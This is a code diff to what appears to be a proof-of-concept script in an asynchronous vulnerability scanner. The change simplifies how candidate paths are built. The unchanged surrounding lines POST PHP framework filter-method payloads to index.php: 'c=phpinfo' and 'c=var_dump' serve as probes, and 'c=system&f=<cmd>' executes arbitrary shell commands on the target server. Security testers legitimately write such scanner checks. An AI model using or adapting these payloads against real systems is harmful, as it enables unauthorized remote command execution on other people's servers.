@@ -30,14 +30,8 @@ class POC(Script):
         if self.base_url:
             headers ={}
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, 'public/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './public/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for poc in ['c=phpinfo&f=1&_method=filter',
                                 'c=var_dump&f=1&_method=filter']:
                         url =  path + '/index.php'
@@ -57,14 +51,8 @@ class POC(Script):
             headers ={ }
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
             poc = 'c=system&f=%s&_method=filter' %parse.quote_plus(cmd)
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, 'public/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './public/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for pocpath in ['index.php']:
                         url = path + pocpath
                         async with session.post(url=url, data=poc, headers=headers) as res:
